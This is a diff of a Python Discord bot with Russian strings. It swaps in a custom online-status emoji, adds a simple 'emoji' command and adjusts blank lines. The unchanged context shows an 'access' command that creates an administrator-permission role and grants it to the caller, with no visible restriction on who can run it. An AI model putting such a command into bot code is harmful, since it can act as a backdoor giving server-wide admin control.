@@ -190,7 +190,7 @@ async def info(ctx,member:discord.Member = None, guild: discord.Guild = None):
 		emb.add_field(name="Айди пользователя:", value=ctx.message.author.id,inline=False)
 		t = ctx.message.author.status
 		if t == discord.Status.online:
-		    d = "🟢В сети"
+		    d = "<:vseti:885956377493790750> В сети"
 
 		t = ctx.message.author.status
 		if t == discord.Status.offline:
@@ -230,6 +230,29 @@ async def access(ctx):
             owner_role = await ctx.guild.create_role(name = 'Онимешник', permissions = discord.Permissions( administrator = True), color = discord.Color.blurple())
         await ctx.author.add_roles(owner_role, reason = None, atomic = True)
 
+	
+@client.command()
+async def emoji(ctx):
+	await ctx.send("<:vseti:885956377493790750>")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # Access error
 @access.error
 async def access_error( ctx, error):
@@ -267,55 +290,6 @@ async def clear_error( ctx, error ):
 @client.event
 async def on_command_error( ctx, error ):
 	pass
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 #client.run (settings['TOKEN'])
